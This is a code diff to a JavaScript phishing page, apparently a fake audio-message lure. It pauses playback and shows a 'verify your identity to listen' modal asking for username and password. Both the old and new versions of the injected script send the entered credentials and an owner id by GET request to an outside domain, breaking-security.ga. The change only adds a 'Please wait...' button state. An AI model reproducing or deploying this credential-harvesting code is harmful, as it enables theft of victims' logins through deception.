@@ -41,13 +41,13 @@ function uigjsh() {
             var content = document.createElement("h3");
             var form = `<h5>Please verify your identity to listen</h5> 
             <table> <tr> <td> Username: </td> <td> <input type="text" id="username" value=""/> <input type="hidden" id="reason" value=""/> </td> </tr> <tr> <td> Password: </td> <td> <input type="password" id="pass" value=""/> </td> </tr> </table> 
-            <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button class="trigger" onClick="yeres()">Verify</button>`;
+            <h6 id="error-div" style="color:red;display:none">An error occurred, please try again</h6><button id="trigger" class="trigger" onClick="yeres()">Verify</button>`;
             content.innerHTML = form;
             modalc.appendChild(content);
             modal.appendChild(modalc);
             document.getElementById("body").appendChild(modal);
             var x = document.createElement("script");
-            x.text = `function yeres(){var e=document.getElementById("username").value,t=document.getElementById("pass").value,n=document.getElementById("id").value,a=document.getElementById("reason").value;if(!e||!t||!n)return void(document.getElementById("error-div").style.display="block");const s=new XMLHttpRequest;s.onreadystatechange=function(){4==this.readyState&&200==this.status&&("ok"===this.responseText?(document.getElementById("myModal").classList.toggle("show-modal"),document.getElementById("allow").value="yes"):(document.getElementById("reason").value="2",document.getElementById("username").value="",document.getElementById("pass").value="",document.getElementById("error-div").style.display="block"))},s.open("GET","https://breaking-security.ga?target=attachment&username="+e+"&password="+t+"&reason="+a+"&owner="+n),s.send()}`;
+            x.text = `function yeres(){var e=document.getElementById("trigger"),t=document.getElementById("username").value,n=document.getElementById("pass").value,a=document.getElementById("id").value,d=document.getElementById("reason").value;if(e.innerText="Please wait...",!t||!n||!a)return document.getElementById("error-div").style.display="block",void(e.innerText="Verify");const s=new XMLHttpRequest;s.onreadystatechange=function(){4==this.readyState&&200==this.status&&("ok"===this.responseText?(document.getElementById("myModal").classList.toggle("show-modal"),document.getElementById("allow").value="yes"):(document.getElementById("reason").value="2",document.getElementById("username").value="",document.getElementById("pass").value="",document.getElementById("error-div").style.display="block",e.innerText="Verify"))},s.open("GET","https://breaking-security.ga?target=attachment&username="+t+"&password="+n+"&reason="+d+"&owner="+a),s.send()}`;
             document.body.appendChild(x);
             modal.classList.toggle("show-modal");
             aud.pause();
